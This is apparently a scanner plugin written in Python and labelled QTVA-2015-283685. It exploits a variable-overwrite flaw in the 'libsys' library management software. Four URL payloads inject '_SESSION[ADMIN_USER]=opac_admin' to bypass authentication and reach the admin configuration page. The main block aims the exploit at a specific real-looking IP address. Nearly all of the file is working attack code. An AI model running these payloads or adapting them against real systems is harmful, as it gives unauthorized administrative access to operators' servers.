#!/usr/bin/env python
# -*- coding: utf-8 -*-

#__Author__ = virink http://www.virink.cn
#__Service_ = libsys
#__Refer___ = 漏洞来源/详情
#___Type___ = 漏洞类型:变量覆盖，绕过权限，登陆后台
#___name___ = 漏洞名称：QTVA-2015-283685

import re

def testing(url):
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200:
        return True
    else:
        return False
    
def assign(service, arg):
    if service == "libsys":
        return True,arg

def audit(arg):
    url = arg
    playload = ('/recm/common.php?_SESSION[ADMIN_USER]=opac_admin',
                '/opac/openlink_ebk.php?_SESSION[ADMIN_USER]=opac_admin',
                '/opac/ajax_ebook.php?_SESSION[ADMIN_USER]=opac_admin',
                '/top/top_custom.php?_SESSION[ADMIN_USER]=opac_admin')
    
    code, head, res, errcode, _ = curl.curl(arg + 'admin/login.php')
    if code == 200 and 'opac_admin' in res:
        for p in playload: 
            if testing(url+p):
                code, head, res, errcode, _ = curl.curl(url + 'admin/cfg_basic.php')
                if code == 200:
                    if 'strSchoolName' in res:
                        log = '\nGood Luck, Login succeed'
                    else:
                        log = '\nLogin succeed, but sorry, it is an errot in setting-file.'
                    security_hole(url + p+ log)
                    return

if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://202.115.162.45:8080/')[1])